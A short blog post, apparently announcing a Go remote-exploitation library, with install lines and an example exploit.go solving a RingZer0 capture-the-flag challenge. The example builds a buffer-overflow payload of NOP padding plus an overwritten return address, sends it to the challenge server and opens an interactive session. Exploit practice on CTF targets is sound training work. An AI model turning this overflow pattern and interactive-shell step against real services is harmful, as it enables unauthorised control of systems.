##### http://www.securitysignal.org/2015/12/securitysocket-remote-exploit-library.html #####

Install Library: go get github.com/hdbreaker/Go-SecuritySocket/ssocket
Import: import "github.com/hdbreaker/Go-SecuritySocket/ssocket"

Example: # Solution with Go of Challenge https://ringzer0team.com/challenges/181

#exploit.go
package main

import (

	"bytes"
	"encoding/binary"
	"strings"
	
	"github.com/hdbreaker/Go-SecuritySocket/ssocket"
)

func main() {

	var raoPromptAdress uint32 = 0x40149B //dirección de memoria de rao_promt
	buffRao := new(bytes.Buffer)
	binary.Write(buffRao, binary.LittleEndian, &raoPromptAdress)
	payload := strings.Repeat("\x90", 56) + string(buffRao.Bytes())
	ss := ssocket.SecuritySocket{Protocol: "tcp", Host: "ringzer0team.com:1001"}
	conn := ss.Connect()
	ss.Send(conn, payload)
	ss.Interactive(conn)

}
